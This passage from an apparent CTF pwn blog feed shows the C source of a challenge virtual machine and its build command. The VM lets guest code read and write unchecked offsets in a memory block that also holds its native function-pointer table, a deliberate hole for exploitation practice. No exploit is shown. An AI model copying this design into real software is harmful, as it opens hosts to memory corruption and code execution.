class="hljs-type">void</span> <span class="hljs-title function_">nop</span><span class="hljs-params">()</span>&#123;<br>    r6++;;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ret</span><span class="hljs-params">()</span>&#123;<br>    pop(&amp;r6);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    sysmm.<span class="hljs-built_in">stack</span>[r7]=*r;<br>    r7++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    r7--;<br>    *r=sysmm.<span class="hljs-built_in">stack</span>[r7];<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=n;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jl</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5==<span class="hljs-number">3</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">js</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5==<span class="hljs-number">1</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">je</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5==<span class="hljs-number">2</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nor</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    *r=~(*r);<br>    r6++;<br>    r6++;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">shl</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    *r=(*r)&lt;&lt;<span class="hljs-number">1</span>;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pac</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    <span class="hljs-built_in">putchar</span>(((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*r]);<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">incr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    (*r)++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    (*r)--;<br>    r6++;<br>    r6++;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gac</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>&#123;<br>    ((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*r]=getchar();<br>    r6++;<br>    r6++;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=(*rd)+(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">and</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=(*rd)&amp;(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">or</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=(*rd)|(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xor</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=(*rd)^(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">movrr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=*rs;<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">movmtr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*rs]+((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*rs+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>;<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">movrtm</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    ((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*rd]=LOBYTE(*rs);<br>    ((<span class="hljs-type">uint8_t</span>*)(&amp;sysmm))[*rd+<span class="hljs-number">1</span>]=HIBYTE(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cmpl</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    r5=(*rd&gt;*rs)?<span class="hljs-number">3</span>:<span class="hljs-number">0</span>;<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cmps</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    r5=(*rd&lt;*rs)?<span class="hljs-number">1</span>:<span class="hljs-number">0</span>;<br>    r6++;<br>    r6++;<br>    r6++;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cmpe</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd, <span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    r5=(*rd==*rs)?<span class="hljs-number">2</span>:<span class="hljs-number">0</span>;<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sub</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>&#123;<br>    *rd=(*rd)-(*rs);<br>    r6++;<br>    r6++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ldr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span> n)</span>&#123;<br>    (*rd)=n;<br>    r6+=<span class="hljs-number">4</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    push(&amp;r6);<br>    r6=(<span class="hljs-type">uint16_t</span>)n;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jne</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5!=<span class="hljs-number">2</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jns</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5!=<span class="hljs-number">1</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jnl</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    r6=(r5!=<span class="hljs-number">3</span>)?(n):(r6+<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>operator.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> OPERATOR_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OPERATOR_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HIBYTE(r) (((r)&gt;&gt;8)&amp;0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOBYTE(r) ((r)&amp;0xff)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*op_a0)</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*op_a1)</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>*)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*op_a2)</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>*,<span class="hljs-type">uint16_t</span>*)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*op_rn)</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>*,<span class="hljs-type">uint16_t</span>)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*op_n)</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inc0</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">dec0</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">nop</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ret</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jl</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">js</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">je</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">nor</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shl</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">pac</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">incr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">decr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">gac</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* r)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jne</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jns</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jnl</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">and</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">or</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">xor</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">movrr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">movmtr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">movrtm</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">cmpl</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">cmps</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">cmpe</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd, <span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sub</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span>* rs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ldr</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>* rd,<span class="hljs-type">uint16_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> n)</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>memory.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;operator.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;registers.h&quot;</span></span><br><br><span class="hljs-comment">// uint16_t stack[STACK_SIZE]=&#123;0&#125;;</span><br><br>mm sysmm;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">load_text</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* buf,<span class="hljs-type">uint8_t</span> n)</span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(sysmm.text,buf,n);<br>    r6=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">load_ftable</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">memset</span>(sysmm.ftable,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(sysmm.ftable));<br>    sysmm.ftable[<span class="hljs-number">0x10</span>]=(<span class="hljs-type">uint64_t</span>)inc0;<br>    sysmm.ftable[<span class="hljs-number">0x11</span>]=(<span class="hljs-type">uint64_t</span>)dec0;<br>    sysmm.ftable[<span class="hljs-number">0x12</span>]=(<span class="hljs-type">uint64_t</span>)nop;<br>    sysmm.ftable[<span class="hljs-number">0x13</span>]=(<span class="hljs-type">uint64_t</span>)ret;<br>    <span class="hljs-comment">// sysmm.ftable[0x14]=(uint64_t)debug;</span><br>    sysmm.ftable[<span class="hljs-number">0x20</span>]=(<span class="hljs-type">uint64_t</span>)push;<br>    sysmm.ftable[<span class="hljs-number">0x21</span>]=(<span class="hljs-type">uint64_t</span>)pop;<br>    <span class="hljs-comment">// sysmm.ftable[0x22]=jmp;</span><br>    <span class="hljs-comment">// sysmm.ftable[0x23]=jl;</span><br>    <span class="hljs-comment">// sysmm.ftable[0x24]=js;</span><br>    <span class="hljs-comment">// sysmm.ftable[0x25]=je;</span><br>    sysmm.ftable[<span class="hljs-number">0x26</span>]=(<span class="hljs-type">uint64_t</span>)nor;<br>    sysmm.ftable[<span class="hljs-number">0x27</span>]=(<span class="hljs-type">uint64_t</span>)shl;<br>    sysmm.ftable[<span class="hljs-number">0x28</span>]=(<span class="hljs-type">uint64_t</span>)pac;<br>    sysmm.ftable[<span class="hljs-number">0x29</span>]=(<span class="hljs-type">uint64_t</span>)incr;<br>    sysmm.ftable[<span class="hljs-number">0x2a</span>]=(<span class="hljs-type">uint64_t</span>)decr;<br>    sysmm.ftable[<span class="hljs-number">0x2b</span>]=(<span class="hljs-type">uint64_t</span>)gac;<br>    <span class="hljs-comment">// sysmm.ftable[0x2c]=jns;</span><br>    <span class="hljs-comment">// sysmm.ftable[0x2d]=jnl;</span><br>    sysmm.ftable[<span class="hljs-number">0x40</span>]=(<span class="hljs-type">uint64_t</span>)add;<br>    sysmm.ftable[<span class="hljs-number">0x41</span>]=(<span class="hljs-type">uint64_t</span>)or;<br>    sysmm.ftable[<span class="hljs-number">0x42</span>]=(<span class="hljs-type">uint64_t</span>)xor;<br>    sysmm.ftable[<span class="hljs-number">0x43</span>]=(<span class="hljs-type">uint64_t</span>)movrr;<br>    sysmm.ftable[<span class="hljs-number">0x44</span>]=(<span class="hljs-type">uint64_t</span>)movmtr;<br>    sysmm.ftable[<span class="hljs-number">0x45</span>]=(<span class="hljs-type">uint64_t</span>)movrtm;<br>    sysmm.ftable[<span class="hljs-number">0x46</span>]=(<span class="hljs-type">uint64_t</span>)cmpl;<br>    sysmm.ftable[<span class="hljs-number">0x47</span>]=(<span class="hljs-type">uint64_t</span>)cmps;<br>    sysmm.ftable[<span class="hljs-number">0x48</span>]=(<span class="hljs-type">uint64_t</span>)cmpe;<br>    sysmm.ftable[<span class="hljs-number">0x49</span>]=(<span class="hljs-type">uint64_t</span>)sub;<br>    sysmm.ftable[<span class="hljs-number">0x60</span>]=(<span class="hljs-type">uint64_t</span>)ldr;<br>    sysmm.ftable[<span class="hljs-number">0x80</span>]=(<span class="hljs-type">uint64_t</span>)call;<br>    sysmm.ftable[<span class="hljs-number">0x81</span>]=(<span class="hljs-type">uint64_t</span>)jne;<br>    sysmm.ftable[<span class="hljs-number">0x82</span>]=(<span class="hljs-type">uint64_t</span>)jns;<br>    sysmm.ftable[<span class="hljs-number">0x83</span>]=(<span class="hljs-type">uint64_t</span>)jnl;<br>    sysmm.ftable[<span class="hljs-number">0x84</span>]=(<span class="hljs-type">uint64_t</span>)jmp;<br>    sysmm.ftable[<span class="hljs-number">0x85</span>]=(<span class="hljs-type">uint64_t</span>)jl;<br>    sysmm.ftable[<span class="hljs-number">0x86</span>]=(<span class="hljs-type">uint64_t</span>)js;<br>    sysmm.ftable[<span class="hljs-number">0x87</span>]=(<span class="hljs-type">uint64_t</span>)je;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_text</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (sysmm.ftable[sysmm.text[r6]]!=<span class="hljs-number">0</span>&amp;&amp;sysmm.text[r6]!=<span class="hljs-number">0</span>&amp;&amp;i!=<span class="hljs-number">0x200</span>)<br>    &#123;<br>        i++;<br>        <span class="hljs-keyword">if</span> (sysmm.text[r6]&gt;=<span class="hljs-number">0x10</span>&amp;&amp;sysmm.text[r6]&lt;<span class="hljs-number">0x20</span>)<br>        &#123;<br>            ((op_a0)sysmm.ftable[sysmm.text[r6]])();<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sysmm.text[r6]&gt;=<span class="hljs-number">0x20</span>&amp;&amp;sysmm.text[r6]&lt;<span class="hljs-number">0x40</span>)<br>        &#123;<br>            ((op_a1)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+<span class="hljs-number">1</span>]]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sysmm.text[r6]&gt;=<span class="hljs-number">0x40</span>&amp;&amp;sysmm.text[r6]&lt;<span class="hljs-number">0x60</span>)<br>        &#123;<br>            ((op_a2)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+<span class="hljs-number">1</span>]],ra[sysmm.text[r6+<span class="hljs-number">2</span>]]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sysmm.text[r6]&gt;=<span class="hljs-number">0x60</span>&amp;&amp;sysmm.text[r6]&lt;<span class="hljs-number">0x80</span>)<br>        &#123;<br>            ((op_rn)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+<span class="hljs-number">1</span>]],sysmm.text[r6+<span class="hljs-number">2</span>]+(sysmm.text[r6+<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">8</span>));<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sysmm.text[r6]&gt;=<span class="hljs-number">0x80</span>&amp;&amp;sysmm.text[r6]&lt;<span class="hljs-number">0x90</span>)<br>        &#123;<br>            ((op_n)sysmm.ftable[sysmm.text[r6]])(sysmm.text[r6+<span class="hljs-number">1</span>]);<br>        &#125;<br>        <br>        <span class="hljs-comment">// debug();</span><br>        <br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; RNUM; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;r%d=%d\n&quot;</span>,i,*ra[i]);<br>    &#125;<br>    <span class="hljs-comment">// r6++;</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>memory.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEXT_SIZE 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FTABLE_SIZE 0x100</span><br><br><br><span class="hljs-comment">// extern uint16_t stack[STACK_SIZE];</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint16_t</span> <span class="hljs-built_in">stack</span>[STACK_SIZE];<br>    <span class="hljs-type">uint16_t</span> global[GLOBAL_SIZE];<br>    <span class="hljs-type">uint8_t</span> text[TEXT_SIZE];<br>    <span class="hljs-type">uint64_t</span> ftable[FTABLE_SIZE];<br>&#125;mm;<br><br><span class="hljs-keyword">extern</span> mm sysmm;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">load_text</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* buf,<span class="hljs-type">uint8_t</span> n)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">load_ftable</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_text</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc vm.c memory.c operator.c registers.c -o vm -z lazy<br></code></pre></td></tr></table></figure><p>编译环境</p><p>ubuntu20.04标准镜像</p>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈与函数</title>
    <link href="/2024/12/05/binary-2024-stack-and-function/"/>
    <url>/2024/12/05/binary-2024-stack-and-function/</url>
    
